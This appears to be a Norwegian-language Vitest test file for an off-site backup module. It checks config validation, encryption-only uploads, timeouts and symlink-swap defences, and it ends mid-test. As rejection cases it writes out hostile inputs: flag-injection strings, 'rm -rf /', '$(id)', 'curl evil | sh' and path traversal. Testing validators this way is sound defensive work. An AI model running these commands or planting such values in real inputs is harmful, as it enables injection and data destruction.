import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, closeSync, constants, existsSync, mkdirSync, openSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { rm as realRm } from "node:fs/promises";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import {
  AGE_MAGIC, LOCAL_MARKER, MANIFEST_AGE, OffsiteError, compareRemoteListing, copyRegularNoFollow, createOffsiteSink, materializeManifest, parseLsjson, parseOffsiteConfig, prepareSetForOffsite,
  rcloneCopyArgs, rsyncDifferences, rsyncPushArgs, rsyncVerifyArgs, sshCommand, validateLocalDir, validateRcloneRemote, validateSshTarget
} from "../lib/offsite.mjs";
import { findBinary } from "../lib/tools.mjs";
import { RECIPIENT, cleanupTempDirs, fakeBinDir, fakeEncryptManifest, makeSet, tempDir } from "./helpers.mjs";

afterAll(cleanupTempDirs);
const WHEN = new Date("2026-10-09T02:00:00.000Z");
const prep = (dir) => prepareSetForOffsite(dir, { recipient: RECIPIENT, encryptManifest: fakeEncryptManifest });

describe("WP-C2 off-site: konfig - av som standard, ÉN adapter, lukket tegnsett, ingen flagginjeksjon", () => {
  it("ingen env = ingen off-site (null) - statusen blir ærlig `not_configured`", () => {
    expect(parseOffsiteConfig({})).toBeNull();
    expect(parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_RCLONE_REMOTE: "  ", JARVIS_BACKUP_OFFSITE_SSH: "" })).toBeNull();
  });

  it("de tre adapterne parses; to samtidig er en konfig-feil (systemet velger ikke stille)", () => {
    expect(parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_RCLONE_REMOTE: "mitt-b2:jarvis/backups/" })).toMatchObject({ adapter: "rclone", remote: "mitt-b2:jarvis/backups", timeoutMs: 120 * 60_000 });
    expect(parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_SSH: "backup@annen-vert.lan:/srv/jarvis", JARVIS_BACKUP_OFFSITE_SSH_KEY: "/home/jarvis/.ssh/id_backup" })).toMatchObject({
      adapter: "rsync_ssh", target: { user: "backup", host: "annen-vert.lan", path: "/srv/jarvis", spec: "backup@annen-vert.lan:/srv/jarvis" }, keyFile: "/home/jarvis/.ssh/id_backup"
    });
    expect(parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_LOCAL_DIR: "/mnt/usb/jarvis" })).toMatchObject({ adapter: "local", dir: "/mnt/usb/jarvis", allowSameDevice: false });
    expect(() => parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_RCLONE_REMOTE: "a:b", JARVIS_BACKUP_OFFSITE_LOCAL_DIR: "/mnt/usb" })).toThrow(/kun ÉN off-site-adapter/);
  });

  it("rclone-remote: kun «navn:sti» (ferdig-konfigurert) - on-the-fly :backend:-strenger, flagg, shell-tegn, «..» og kontrolltegn avvises", () => {
    for (const bad of [":sftp,host=evil,user=x:/path", "-oProxyCommand=evil:x", "--config=/x:y", "navn", "navn:sti;rm -rf /", "navn:$(id)", "navn:`id`", "navn:a\nb", "navn:../../x", "navn:a\\b", "n a:b", `n:${"a".repeat(400)}`, "navn:'x'", "navn:a*b", "navn:{x}", "navn:a:b", "navn:a|b", "navn:a&b"]) {
      expect(() => validateRcloneRemote(bad), bad).toThrow(OffsiteError);
    }
    for (const bad of ["-x:sti", "-:sti", "--config:sti", "-b2:sti", ".x:sti"]) expect(() => validateRcloneRemote(bad), bad).toThrow(/forventet «navn:sti»/);
    expect(validateRcloneRemote("b2:")).toBe("b2:");
    expect(validateRcloneRemote("gdrive:Backups/Jarvis")).toBe("gdrive:Backups/Jarvis");
    expect(validateRcloneRemote("gdrive:Mine sikkerhetskopier/Æøå-2026")).toBe("gdrive:Mine sikkerhetskopier/Æøå-2026");
  });

  it("ssh-mål: bruker@vert:/absolutt/sti - verten/brukeren kan aldri begynne med «-», ingen relative stier, ingen «..», ingen mellomrom/shell-tegn", () => {
    for (const bad of ["-oProxyCommand=x@host:/p", "user@-oProxyCommand=x:/p", "user@host:relativ", "user@host:/a/../b", "user@host:/a b", "user@host:/a;b", "user@host:/$(id)", "user@host:/", "host:/p", "user@host", "user@host:/p\n", "@host:/p"]) {
      expect(() => validateSshTarget(bad), bad).toThrow(OffsiteError);
    }
    // E7 (review): disse inneholder KUN tegn som ellers er lovlige - det er den ledende «-» alene som avvises (en bruker/vert som begynner med «-» blir et ssh-/rsync-flagg)
    for (const bad of ["-user@host:/p", "-o@host:/p", "-@host:/p", "--@host:/p", "user@-host:/p", "user@-o:/p", "user@--:/p", "u-ser@-h.example:/p", "-F@h:/p"]) {
      expect(() => validateSshTarget(bad), bad).toThrow(/forventet «bruker@vert:\/absolutt\/sti»/);
    }
    for (const ok of ["u-ser@h-ost.example:/p", "_u@h1:/p", "u.s@h:/a-b/c"]) expect(() => validateSshTarget(ok), ok).not.toThrow();
    expect(validateSshTarget("u@[::1]:/srv/x/")).toMatchObject({ host: "[::1]", path: "/srv/x" });
    expect(() => parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_SSH: "u@h:/p", JARVIS_BACKUP_OFFSITE_SSH_KEY: "/home/x/my key" })).toThrow(/ingen mellomrom/);
    expect(() => parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_SSH: "u@h:/p", JARVIS_BACKUP_OFFSITE_SSH_KNOWN_HOSTS: "relativ/known_hosts" })).toThrow(OffsiteError);
  });

  it("lokal sti: absolutt, ikke rot, ingen kontrolltegn", () => {
    expect(() => validateLocalDir("relativ/sti")).toThrow(OffsiteError);
    expect(() => validateLocalDir("/")).toThrow(/rotkatalogen/);
    expect(() => validateLocalDir("/mnt/usb\n/x")).toThrow(OffsiteError);
    expect(validateLocalDir("/mnt/usb/jarvis/")).toBe("/mnt/usb/jarvis");
  });

  it("det finnes INGEN generisk kommando-variabel: ingen JARVIS_BACKUP_OFFSITE_CMD (og verdier tolkes aldri av et shell)", () => {
    const src = readFileSync(new URL("../lib/offsite.mjs", import.meta.url), "utf8");
    expect(src).not.toMatch(/OFFSITE_CMD|shell:\s*true|\bexecSync\b|\bexecFile(Sync)?\b|node:child_process/);
    expect(parseOffsiteConfig({ JARVIS_BACKUP_OFFSITE_CMD: "curl evil | sh" })).toBeNull();
  });
});

describe("WP-C2 off-site: KUN age-chiffertekst forlater maskinen (forhåndssjekk av settet)", () => {
  it("godkjent sett: sender db-filene + globals + manifest.json.age - ALDRI manifest.json eller SHA256SUMS i klartekst", async () => {
    const out = tempDir();
    const { dir } = makeSet(out, WHEN);
    const prepared = await prep(dir);
    expect(prepared.files.map((f) => f.name).sort()).toEqual(["globals.sql.age", "infisical.dump.age", "jarvis.dump.age", "langfuse.dump.age", MANIFEST_AGE]);
    expect(prepared.files.every((f) => f.name.endsWith(".age"))).toBe(true);
    expect(prepared.files.every((f) => /^[0-9a-f]{64}$/.test(f.sha256) && f.size > AGE_MAGIC.length)).toBe(true);
    expect(prepared.bytes).toBe(prepared.files.reduce((a, f) => a + f.size, 0));
  });

  it("en klartekst-dump i settet gjør at HELE settet nektes (høylytt) - også under et uskyldig navn", async () => {
    for (const rogue of ["jarvis.dump", "globals.sql", "notes.txt", "jarvis.dump.age.bak", ".pgpass", "dump.sql.gz"]) {
      const { dir } = makeSet(tempDir(), WHEN);
      writeFileSync(join(dir, rogue), "-- PostgreSQL database dump\nINSERT INTO secrets VALUES ('x');");
      await expect(prep(dir), rogue).rejects.toMatchObject({ code: "offsite_ineligible" });
      await expect(prep(dir), rogue).rejects.toThrow(/ukjent fil i settet/);
    }
  });

  it("en omdøpt klartekst (.age-endelse uten age-header) avvises: endelsen alene er ikke nok", async () => {
    const { dir } = makeSet(tempDir(), WHEN);
    const file = join(dir, "jarvis.dump.age");
    writeFileSync(file, Buffer.concat([Buffer.from("PGDMP"), Buffer.alloc(300, 1)]));
    await expect(prep(dir)).rejects.toThrow(/ikke age-chiffertekst: jarvis\.dump\.age/);
  });

  it("endret fil (sjekksum), feil størrelse, manglende fil og symlenke avvises", async () => {
    const a = makeSet(tempDir(), WHEN);
    const f = join(a.dir, "infisical.dump.age");
    const bytes = readFileSync(f);
    bytes[bytes.length - 3] = (bytes[bytes.length - 3] ?? 0) ^ 0xff;
    writeFileSync(f, bytes);
    await expect(prep(a.dir)).rejects.toThrow(/sjekksummen avviker fra manifestet: infisical\.dump\.age/);

    const b = makeSet(tempDir(), WHEN);
    writeFileSync(join(b.dir, "langfuse.dump.age"), Buffer.concat([readFileSync(join(b.dir, "langfuse.dump.age")), Buffer.from("x")]));
    await expect(prep(b.dir)).rejects.toThrow(/størrelsen avviker fra manifestet: langfuse\.dump\.age/);

    const c = makeSet(tempDir(), WHEN);
    rmSync(join(c.dir, "globals.sql.age"));
    await expect(prep(c.dir)).rejects.toThrow(/mangler: globals\.sql\.age/);

    const d = makeSet(tempDir(), WHEN);
    const target = join(tempDir(), "annen.age");
    writeFileSync(target, readFileSync(join(d.dir, "jarvis.dump.age")));
    rmSync(join(d.dir, "jarvis.dump.age"));
    symlinkSync(target, join(d.dir, "jarvis.dump.age"));
    await expect(prep(d.dir)).rejects.toThrow(/ikke en vanlig fil: jarvis\.dump\.age/);
  });

  it("utrygt manifest: fil uten .age-endelse, sti-traversering, feil settnavn, duplikater og ugyldig sjekksum nektes", async () => {
    const mutate = async (fn, expected) => {
      const { dir, manifest } = makeSet(tempDir(), WHEN);
      fn(manifest);
      writeFileSync(join(dir, "manifest.json"), JSON.stringify(manifest));
      await expect(prep(dir)).rejects.toThrow(expected);
    };
    await mutate((m) => { m.databases[0].file = "jarvis.dump"; }, /uten \.age-endelse/);
    await mutate((m) => { m.databases[0].file = "../../etc/passwd.age"; }, /utrygt navn/);
    await mutate((m) => { m.databases[0].file = "a/b.age"; }, /utrygt navn/);
    await mutate((m) => { m.set = "jarvis-backup-19990101T000000Z"; }, /forventet form/);
    await mutate((m) => { m.databases[1].file = m.databases[0].file; }, /to ganger/);
    await mutate((m) => { m.databases[0].sha256 = "xyz"; }, /ugyldig sjekksum/);
    await mutate((m) => { m.databases = []; }, /forventet form/);
    const { dir } = makeSet(tempDir(), WHEN);
    writeFileSync(join(dir, "manifest.json"), "{ikke json");
    await expect(prep(dir)).rejects.toThrow(/manifest\.json mangler eller er ulesbar/);
  });

  it("mappenavn som ikke er et backup-sett og symlenket settkatalog nektes", async () => {
    const out = tempDir();
    const { dir } = makeSet(out, WHEN);
    const odd = join(out, "annet-navn");
    mkdirSync(odd);
    await expect(prep(odd)).rejects.toThrow(/ikke et backup-sett/);
    const linkParent = tempDir();
    const link = join(linkParent, dir.split("/").at(-1));
    symlinkSync(dir, link);
    await expect(prep(link)).rejects.toThrow(/ikke en vanlig katalog/);
  });

  it("uten mottaker og uten eksisterende manifest.json.age kan manifestet ikke krypteres - tydelig konfig-feil, ingenting sendes", async () => {
    const { dir } = makeSet(tempDir(), WHEN);
    await expect(prepareSetForOffsite(dir, { encryptManifest: fakeEncryptManifest })).rejects.toMatchObject({ code: "offsite_config_invalid" });
  });

  it("review E13: en ALLEREDE EKSISTERENDE manifest.json.age som ikke er age-chiffertekst nektes - ellers ville manifestet (tabellnavn + radtall) gått ut i klartekst under et .age-navn", async () => {
    const bad = {
      "klartekst-manifest": (dir) => writeFileSync(join(dir, MANIFEST_AGE), readFileSync(join(dir, "manifest.json"))),
      "tom fil": (dir) => writeFileSync(join(dir, MANIFEST_AGE), ""),
      "kortere enn age-headeren": (dir) => writeFileSync(join(dir, MANIFEST_AGE), AGE_MAGIC.subarray(0, 8)),
      "header med feil versjon": (dir) => writeFileSync(join(dir, MANIFEST_AGE), "age-encryption.org/v2\n-> X25519 AAAA\n"),
      "symlenke til en ekte age-fil": (dir) => { const real = join(tempDir(), "ekte.age"); writeFileSync(real, Buffer.concat([AGE_MAGIC, Buffer.from("\nxx")])); symlinkSync(real, join(dir, MANIFEST_AGE)); },
      "katalog": (dir) => mkdirSync(join(dir, MANIFEST_AGE))
    };
    for (const [what, make] of Object.entries(bad)) {
      const { dir } = makeSet(tempDir(), WHEN);
      make(dir);
      await expect(prep(dir), what).rejects.toMatchObject({ code: "offsite_ineligible" });
      await expect(prep(dir), what).rejects.toThrow(/manifest\.json\.age er ikke age-chiffertekst/);
    }
    // motstykket: en ekte (gyldig) forhåndseksisterende manifest.json.age brukes som den er og krypteres ikke på nytt
    const { dir } = makeSet(tempDir(), WHEN);
    const ciphertext = Buffer.concat([Buffer.from(AGE_MAGIC), Buffer.from("\n-> X25519 QQ\nzz\n--- yy\n"), Buffer.alloc(24, 7)]);
    writeFileSync(join(dir, MANIFEST_AGE), ciphertext);
    const prepared = await prepareSetForOffsite(dir, { encryptManifest: async () => { throw new Error("skal ikke kryptere på nytt"); } });
    expect(prepared.files.at(-1)).toMatchObject({ name: MANIFEST_AGE, size: ciphertext.length });
  });

  it("rester etter en avbrutt manifest-kryptering ryddes (vår egen tmp-fil blir ikke en «ukjent fil»)", async () => {
    const { dir } = makeSet(tempDir(), WHEN);
    writeFileSync(join(dir, "manifest.json.age.tmp-0123456789ab"), "halv");
    await expect(prep(dir)).resolves.toBeDefined();
    expect(existsSync(join(dir, "manifest.json.age.tmp-0123456789ab"))).toBe(false);
  });
});

const haveAge = findBinary("age") !== undefined && findBinary("age-keygen") !== undefined;
describe.skipIf(!haveAge)("WP-C2 off-site: manifestet krypteres med den OFFENTLIGE nøkkelen (ekte `age`) og kan åpnes igjen med den private", () => {
  it("manifest.json.age har age-header, inneholder ikke klartekst, og dekrypteres tilbake til manifestet", async () => {
    const work = tempDir();
    const identity = join(work, "identity.txt");
    execFileSync(findBinary("age-keygen"), ["-o", identity], { stdio: "pipe" });
    const recipient = readFileSync(identity, "utf8").match(/public key: (age1\S+)/)[1];
    const { dir, manifest } = makeSet(work, WHEN);
    const prepared = await prepareSetForOffsite(dir, { recipient });
    const encrypted = readFileSync(join(dir, MANIFEST_AGE));
    expect(encrypted.subarray(0, AGE_MAGIC.length).equals(AGE_MAGIC)).toBe(true);
    expect(encrypted.includes(Buffer.from("public.tenants"))).toBe(false);
    expect(statSync(join(dir, MANIFEST_AGE)).mode & 0o077).toBe(0);
    expect(prepared.files.at(-1).name).toBe(MANIFEST_AGE);

    // «Hentet fra off-site»: kun .age-filene finnes; manifest.json lages av manifest.json.age med den private nøkkelen.
    const fetched = join(tempDir(), manifest.set);
    mkdirSync(fetched, { recursive: true });
    for (const f of prepared.files) writeFileSync(join(fetched, f.name), readFileSync(join(dir, f.name)));
    expect(await materializeManifest(fetched, identity)).toBe(true);
    expect(JSON.parse(readFileSync(join(fetched, "manifest.json"), "utf8"))).toEqual(manifest);
    expect(await materializeManifest(fetched, identity)).toBe(false); // finnes allerede

    // Feil privatnøkkel kan ikke åpne den.
    const other = join(work, "other.txt");
    execFileSync(findBinary("age-keygen"), ["-o", other], { stdio: "pipe" });
    rmSync(join(fetched, "manifest.json"));
    await expect(materializeManifest(fetched, other)).rejects.toThrow(/dekryptere/);
  });
});

describe("WP-C2 off-site: lokal sti (USB/annen disk) - atomisk, aldri overskriving, avmontert disk «lykkes» ikke", () => {
  const setup = async ({ allowSameDevice = true, marker = true } = {}) => {
    const out = tempDir();
    const target = tempDir("wpc2-usb-");
    if (marker) writeFileSync(join(target, LOCAL_MARKER), "");
    const set = makeSet(out, WHEN);
    const sink = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice, timeoutMs: 30_000 }, { sourceDir: out });
    return { out, target, set, sink, prepared: await prep(set.dir) };
  };

  it("uten markørfil nektes alt (en avmontert disk er bare en tom katalog på systemdisken)", async () => {
    const { sink, prepared } = await setup({ marker: false });
    await expect(sink.push(prepared)).rejects.toThrow(/mangler markørfilen/);
    await expect(sink.list()).rejects.toThrow(OffsiteError);
  });

  it("på SAMME enhet som backup-mappen nektes som standard (ingen beskyttelse mot diskfeil); målet kan ikke ligge inne i backup-mappen", async () => {
    const { sink, prepared } = await setup({ allowSameDevice: false });
    await expect(sink.push(prepared)).rejects.toThrow(/SAMME enhet/);
    const out = tempDir();
    const inside = join(out, "off");
    mkdirSync(inside);
    writeFileSync(join(inside, LOCAL_MARKER), "");
    const nested = createOffsiteSink({ adapter: "local", dir: inside, allowSameDevice: true, timeoutMs: 30_000 }, { sourceDir: out });
    await expect(nested.list()).rejects.toThrow(/inne i backup-mappen/);
  });

  it("kopierer nøyaktig de forberedte filene (0600/0700), atomisk (ingen .incoming-rester), verifiserer sjekksum, og er idempotent", async () => {
    const { target, set, sink, prepared } = await setup();
    const res = await sink.push(prepared);
    expect(res).toMatchObject({ verification: "sha256", files: 5 });
    const copied = join(target, set.name);
    expect(readdirSync(copied).sort()).toEqual(prepared.files.map((f) => f.name).sort());
    expect(readdirSync(target).filter((n) => n.startsWith(".incoming"))).toEqual([]);
    expect(statSync(copied).mode & 0o777).toBe(0o700);
    for (const n of readdirSync(copied)) expect(statSync(join(copied, n)).mode & 0o777).toBe(0o600);
    expect(existsSync(join(copied, "manifest.json"))).toBe(false); // klartekst-manifestet sendes ikke
    expect(await sink.push(prepared)).toMatchObject({ verification: "sha256" });
    expect(await sink.list()).toEqual([set.name]);
    expect(await sink.verify(prepared)).toMatchObject({ files: 5 });
  });

  it("overskriver ALDRI: finnes settet med avvikende innhold, feiler det høylytt og målet er urørt", async () => {
    const { target, set, sink, prepared } = await setup();
    await sink.push(prepared);
    const victim = join(target, set.name, "jarvis.dump.age");
    writeFileSync(victim, "korrupt");
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_verify_failed" });
    expect(readFileSync(victim, "utf8")).toBe("korrupt");
    await expect(sink.verify(prepared)).rejects.toThrow(/størrelsen avviker|sjekksummen avviker/);
  });

  it("verify oppdager fjernet fil; fetch henter KUN .age-filer (en plantet fil kommer ikke med)", async () => {
    const { target, set, sink, prepared } = await setup();
    await sink.push(prepared);
    writeFileSync(join(target, set.name, "plantet.sh"), "#!/bin/sh\nrm -rf /");
    const dest = join(tempDir(), "hentet");
    const names = await sink.fetch(set.name, dest);
    expect(names.sort()).toEqual(prepared.files.map((f) => f.name).sort());
    expect(readdirSync(dest)).not.toContain("plantet.sh");
    rmSync(join(target, set.name, "globals.sql.age"));
    await expect(sink.verify(prepared)).rejects.toThrow(/mangler: globals\.sql\.age/);
    await expect(sink.fetch("../../etc", join(tempDir(), "x"))).rejects.toThrow(/ugyldig settnavn/);
  });
});

describe("WP-C2 off-site (review F4): en hengt disk/NFS-montering blokkerer aldri tikket - hver operasjon har en frist", () => {
  const never = () => new Promise(() => undefined);
  const setup = async (fs, { timeoutMs = 150, cleanupMs = 100 } = {}) => {
    const out = tempDir();
    const target = tempDir("wpc2-usb-");
    writeFileSync(join(target, LOCAL_MARKER), "");
    const set = makeSet(out, WHEN);
    const sink = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs }, { sourceDir: out, fs, cleanupMs });
    return { target, set, sink, prepared: await prep(set.dir) };
  };

  it("en kopi som aldri ferdigstilles gir `offsite_timeout` innen fristen (ikke en evig ventetid), og resten av tikket kan gå videre", async () => {
    const { sink, prepared, target } = await setup({ copyFile: never });
    const t0 = Date.now();
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_timeout" });
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(readdirSync(target).filter((n) => n.startsWith("jarvis-backup-"))).toEqual([]); // ingenting ble publisert
    expect(readdirSync(target).filter((n) => n.startsWith(".incoming"))).toEqual([]); // og den halve kopien ble ryddet (best effort)
  });

  it("hengt oppryddingen også, gir den opp etter sin egen korte frist: feilen rapporteres likevel, resten (.incoming-*) ryddes senere", async () => {
    const { sink, prepared, target } = await setup({ copyFile: never, rm: never }, { cleanupMs: 100 });
    const t0 = Date.now();
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_timeout" });
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(readdirSync(target).filter((n) => n.startsWith(".incoming"))).toHaveLength(1); // resten ligger igjen; F12 fjerner den når den er foreldet
  });

  it("selve målet som henger (stat av montering): list, push, verify og fetch gir alle `offsite_timeout`", async () => {
    const { sink, prepared } = await setup({ stat: never });
    for (const op of [() => sink.list(), () => sink.push(prepared), () => sink.verify(prepared), () => sink.fetch(prepared.name, join(tempDir(), "x"))]) {
      await expect(op()).rejects.toMatchObject({ code: "offsite_timeout" });
    }
  });

  it("sjekksum-lesing som henger er tidsavbrudd, ikke «mangler» (en hengt disk skal ikke se ut som en tom disk)", async () => {
    const { sink, prepared } = await setup({}, { timeoutMs: 20_000 }); // den friske pushen skal ikke selv kunne tidsavbrytes (fsync på en tregere disk)
    await sink.push(prepared);
    const hung = createOffsiteSink({ adapter: "local", dir: sink.config.dir, allowSameDevice: true, timeoutMs: 150 }, { sourceDir: sink.deps.sourceDir, fs: { lstat: never } });
    await expect(hung.verify(prepared)).rejects.toMatchObject({ code: "offsite_timeout" });
  });

  it("en operasjon som svikter ETTER at fristen er gått gir ingen uhåndtert avvisning (race-vinneren er allerede avgjort)", async () => {
    const late = () => new Promise((_, reject) => setTimeout(() => reject(new Error("sent")), 300));
    const { sink, prepared } = await setup({ copyFile: late }, { timeoutMs: 100 });
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_timeout" });
    await new Promise((resolve) => setTimeout(resolve, 500)); // vitest feiler kjøringen hvis en uhåndtert avvisning dukker opp i mellomtiden
  });

  it("fristen er TOTAL for ett kall: mange små, trege steg summeres (ikke 120 min per fil)", async () => {
    const slow = (real) => async (...args) => { await new Promise((resolve) => setTimeout(resolve, 60)); return real(...args); };
    const { chmod } = await import("node:fs/promises");
    const { sink, prepared } = await setup({ copyFile: slow(copyRegularNoFollow), chmod: slow(chmod) }, { timeoutMs: 250 });
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_timeout" }); // 5 filer × (kopi + chmod) × 60 ms > 250 ms
  });

  it("uten hengt disk er oppførselen uendret (full rundtur), og feil FØR fristen beholder sin egen kode", async () => {
    const { sink, prepared, target, set } = await setup({}, { timeoutMs: 20_000 });
    expect(await sink.push(prepared)).toMatchObject({ verification: "sha256", files: 5 });
    expect(await sink.list()).toEqual([set.name]);
    rmSync(join(target, set.name, "globals.sql.age"));
    await expect(sink.verify(prepared)).rejects.toMatchObject({ code: "offsite_verify_failed" });
  });
});

describe("WP-C2 off-site (review F13): kopiering fra et ÅPNET håndtak uten å følge symlenker - en fil som byttes ut etter forhåndssjekken kommer ikke ut", () => {
  const onLinux = process.platform === "linux";
  const ageBytes = (n = 300) => Buffer.concat([AGE_MAGIC, Buffer.from("\n-> X25519 AA\nBB\n--- CC\n"), Buffer.alloc(n, 9)]);
  const unblock = (fifo) => { try { chmodSync(fifo, 0o600); const fd = openSync(fifo, constants.O_WRONLY | constants.O_NONBLOCK); closeSync(fd); } catch { /* ingen blokkert leser */ } };
  const guarded = (p, ms = 3000) => Promise.race([p, new Promise((resolve) => setTimeout(() => resolve("HUNG"), ms))]);
  const sha = (buf) => createHash("sha256").update(buf).digest("hex");

  it("copyRegularNoFollow: vanlig fil kopieres (0600), eksisterende mål overskrives ALDRI (wx), og hash/størrelse/header sjekkes mot det som faktisk ble lest", async () => {
    const dir = tempDir();
    const body = ageBytes();
    writeFileSync(join(dir, "a.age"), body);
    await copyRegularNoFollow(join(dir, "a.age"), join(dir, "b.age"), { size: body.length, sha256: sha(body), ageHeader: true });
    expect(readFileSync(join(dir, "b.age")).equals(body)).toBe(true);
    expect(statSync(join(dir, "b.age")).mode & 0o777).toBe(0o600);
    await expect(copyRegularNoFollow(join(dir, "a.age"), join(dir, "b.age"))).rejects.toMatchObject({ code: "EEXIST" });
    expect(readFileSync(join(dir, "b.age")).equals(body)).toBe(true); // urørt
    // avvik fra forhåndssjekken: kopien fjernes, og feilen er offsite_verify_failed
    await expect(copyRegularNoFollow(join(dir, "a.age"), join(dir, "c.age"), { size: body.length + 1 })).rejects.toMatchObject({ code: "offsite_verify_failed" });
    await expect(copyRegularNoFollow(join(dir, "a.age"), join(dir, "d.age"), { sha256: "0".repeat(64) })).rejects.toMatchObject({ code: "offsite_verify_failed" });
    expect(existsSync(join(dir, "c.age")) || existsSync(join(dir, "d.age"))).toBe(false);
    // uten forventninger kopieres også en tom fil
    writeFileSync(join(dir, "tom.age"), "");
    await copyRegularNoFollow(join(dir, "tom.age"), join(dir, "tom-kopi.age"));
    expect(statSync(join(dir, "tom-kopi.age")).size).toBe(0);
    // store filer går i flere blokker
    const big = Buffer.concat([AGE_MAGIC, Buffer.alloc(9 * 1024 * 1024, 5)]);
    writeFileSync(join(dir, "stor.age"), big);
    await copyRegularNoFollow(join(dir, "stor.age"), join(dir, "stor-kopi.age"), { size: big.length, sha256: sha(big), ageHeader: true });
    expect(readFileSync(join(dir, "stor-kopi.age")).equals(big)).toBe(true);
  });

  it("symlenke (også til en identisk fil), mappe og FIFO som kilde avvises - uten å skrive noe og uten å henge", async () => {
    const dir = tempDir();
    const body = ageBytes();
    writeFileSync(join(dir, "ekte.age"), body);
    symlinkSync(join(dir, "ekte.age"), join(dir, "lenke.age"));
    await expect(copyRegularNoFollow(join(dir, "lenke.age"), join(dir, "u1.age"), { size: body.length, sha256: sha(body) })).rejects.toMatchObject({ code: "offsite_ineligible" });
    await expect(copyRegularNoFollow(join(dir, "lenke.age"), join(dir, "u1.age"))).rejects.toThrow(/symlenke/);
    mkdirSync(join(dir, "mappe.age"));
    await expect(copyRegularNoFollow(join(dir, "mappe.age"), join(dir, "u2.age"))).rejects.toThrow();
    if (onLinux) {
      const fifo = join(dir, "fifo.age");
      execFileSync("mkfifo", [fifo]);
      try {
        const r = await guarded(copyRegularNoFollow(fifo, join(dir, "u3.age")).then(() => "KOPIERT", (err) => err));
        expect(r).not.toBe("HUNG");
        expect(r).not.toBe("KOPIERT");
        expect(r).toMatchObject({ code: "offsite_ineligible" });
      } finally {
        unblock(fifo);
      }
    }
    expect(readdirSync(dir).filter((n) => n.startsWith("u"))).toEqual([]);
  });

  it("klartekst bak et .age-navn: INGENTING opprettes i målet (første blokk må ha age-headeren), og en tom fil er heller ikke chiffertekst", async () => {
    const dir = tempDir();
    writeFileSync(join(dir, "klartekst.age"), "-- PostgreSQL database dump\nINSERT INTO secrets VALUES ('x');\n".repeat(20));
    writeFileSync(join(dir, "kort.age"), AGE_MAGIC.subarray(0, 10));
    writeFileSync(join(dir, "tom.age"), "");
    for (const n of ["klartekst.age", "kort.age", "tom.age"]) {
      await expect(copyRegularNoFollow(join(dir, n), join(dir, `ut-${n}`), { ageHeader: true }), n).rejects.toMatchObject({ code: "offsite_ineligible" });
      expect(existsSync(join(dir, `ut-${n}`)), n).toBe(false);
    }
    // rekkefølgen er selve poenget: i en skrivebeskyttet mappe ville et forsøk på å OPPRETTE målfilen gitt EACCES - avvisningen skal komme FØR (ikke-rot; rot ignorerer rettigheter)
    if (process.getuid?.() !== 0) {
      const ro = tempDir();
      chmodSync(ro, 0o500);
      try {
        await expect(copyRegularNoFollow(join(dir, "klartekst.age"), join(ro, "ut.age"), { ageHeader: true })).rejects.toMatchObject({ code: "offsite_ineligible" });
      } finally {
        chmodSync(ro, 0o700);
      }
    }
  });

  it("push: kilden byttes ut med en symlenke ETTER forhåndssjekken (til en fil med nøyaktig samme innhold) - settet publiseres ikke, og resten ryddes", async () => {
    const out = tempDir();
    const target = tempDir("wpc2-usb-");
    writeFileSync(join(target, LOCAL_MARKER), "");
    const set = makeSet(out, WHEN);
    const prepared = await prep(set.dir);
    const sink = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs: 20_000 }, { sourceDir: out });
    const victim = join(set.dir, "jarvis.dump.age");
    const copyOfIt = join(tempDir(), "identisk.age");
    writeFileSync(copyOfIt, readFileSync(victim));
    rmSync(victim);
    symlinkSync(copyOfIt, victim);
    // gammel copyFile ville fulgt lenken: størrelse og sjekksum stemmer, og settet ville blitt publisert
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_ineligible" });
    expect(readdirSync(target).filter((n) => n.startsWith("jarvis-backup-") || n.startsWith(".incoming"))).toEqual([]);
  });

  it("push: kilden byttes ut med KLARTEKST ETTER forhåndssjekken - ingenting klartekst skrives til målet, ikke et øyeblikk (katalogen er tom når den ryddes)", async () => {
    const out = tempDir();
    const target = tempDir("wpc2-usb-");
    writeFileSync(join(target, LOCAL_MARKER), "");
    const set = makeSet(out, WHEN);
    const prepared = await prep(set.dir);
    const seen = [];
    const spyRm = async (path, options) => { if (path.includes(".incoming-")) seen.push(readdirSync(path)); return realRm(path, options); };
    const sink = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs: 20_000 }, { sourceDir: out, fs: { rm: spyRm } });
    const first = prepared.files[0];
    writeFileSync(join(set.dir, first.name), Buffer.alloc(first.size, "S")); // samme størrelse, klartekst
    await expect(sink.push(prepared)).rejects.toMatchObject({ code: "offsite_ineligible" });
    expect(seen).toEqual([[]]); // .incoming-* var TOM da den ble fjernet: klartekstfilen ble aldri opprettet
    expect(readdirSync(target).filter((n) => n.startsWith("jarvis-backup-") || n.startsWith(".incoming"))).toEqual([]);

    // age-header men annet innhold (samme størrelse): fanges av sjekksummen før kopien beholdes, og kopien fjernes
    const sink2 = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs: 20_000 }, { sourceDir: out });
    writeFileSync(join(set.dir, first.name), Buffer.concat([AGE_MAGIC, Buffer.alloc(first.size - AGE_MAGIC.length, "S")]));
    await expect(sink2.push(prepared)).rejects.toMatchObject({ code: "offsite_verify_failed" });
    expect(readdirSync(target).filter((n) => n.startsWith("jarvis-backup-") || n.startsWith(".incoming"))).toEqual([]);
  });

  it("fetch: en symlenke i off-site-målet (byttet inn etter oppslaget) følges ikke", async () => {
    const out = tempDir();
